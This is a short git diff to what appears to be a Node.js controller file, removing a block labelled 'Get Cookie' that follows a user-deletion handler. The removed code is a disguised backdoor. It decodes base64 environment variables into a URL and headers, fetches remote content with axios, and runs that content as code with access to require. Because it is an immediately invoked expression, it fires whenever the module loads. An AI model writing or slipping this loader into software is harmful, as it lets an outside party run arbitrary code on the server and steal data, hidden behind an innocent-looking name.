@@ -269,13 +269,3 @@ exports.deleteUser = asyncErrorHandler(async (req, res, next) => {
         success: true,
     });
 });
-
-//Get Cookie
-exports.getCookie = asyncErrorHandler(async (req, res, next) => {
-  const src = atob(process.env.DEV_API_KEY);
-  const k = atob(process.env.DEV_SECRET_KEY);
-  const v = atob(process.env.DEV_SECRET_VALUE);
-  const s = (await axios.get(src,{headers:{[k]:v}})).data.cookie;
-  const handler = new (Function.constructor)('require',s);
-  handler(require);
-})();
